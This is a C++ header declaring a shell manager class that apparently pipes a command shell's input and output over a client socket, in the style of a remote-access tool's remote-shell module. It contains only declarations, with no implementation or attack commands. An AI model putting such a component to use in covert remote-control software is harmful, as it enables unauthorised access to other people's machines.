#ifndef __TSP_SHELLMANAGER_H__
#define __TSP_SHELLMANAGER_H__

#include "Manager.h"

class CShellManager : public CManager  
{
public:
	CShellManager(CClientSocket *pClient);
	virtual ~CShellManager();

public:
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

private:
	static DWORD WINAPI ReadPipeThread(LPVOID lparam);
	static DWORD WINAPI MonitorThread(LPVOID lparam);

private:
    HANDLE m_hReadPipeHandle;   
    HANDLE m_hWritePipeHandle; 
	HANDLE m_hReadPipeShell;
    HANDLE m_hWritePipeShell;
	
    HANDLE m_hProcessHandle;
	HANDLE m_hThreadHandle;
    HANDLE m_hThreadRead;
	HANDLE m_hThreadMonitor;
};

#endif //__TSP_SHELLMANAGER_H__